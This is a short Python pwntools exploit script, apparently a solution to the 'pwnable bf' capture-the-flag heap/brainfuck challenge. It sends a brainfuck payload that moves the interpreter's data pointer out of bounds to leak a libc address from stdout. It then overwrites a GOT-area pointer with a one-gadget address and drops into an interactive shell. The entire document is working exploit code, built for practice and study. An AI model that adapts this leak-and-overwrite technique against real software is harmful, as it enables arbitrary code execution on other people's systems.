#!/usr/bin/env python3

from pwn import *

elf = ELF("./data/bin/heap23_47_pwnable_bf")
libc = elf.libc
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./data/bin/heap23_47_pwnable_bf")

pd = ''
pd+= '<'*0x40   #now p in 0x804a040
pd+= '.>'*4     #now p in 0x804a044
pd+= '<'*(0x48 + 0x4 - 0x18) #now p in 0x804a030
pd+= ',>'*4
pd+= '.'


p.sendlineafter('except [ ]',pd)
p.recv()
IO_2_1_stdout_ = u32(p.recv(4))
lb = IO_2_1_stdout_ - libc.sym._IO_2_1_stdout_
log.success('libc_base: ' + hex(lb))
sleep(1)

#ogg = p64(lb + 0x5f066)
ogg = p64(lb + 0x5fbd6)
#ogg = p64(libc.sym.gets)
for i in range(4):
    p.send(ogg[i:i+1])

p.interactive()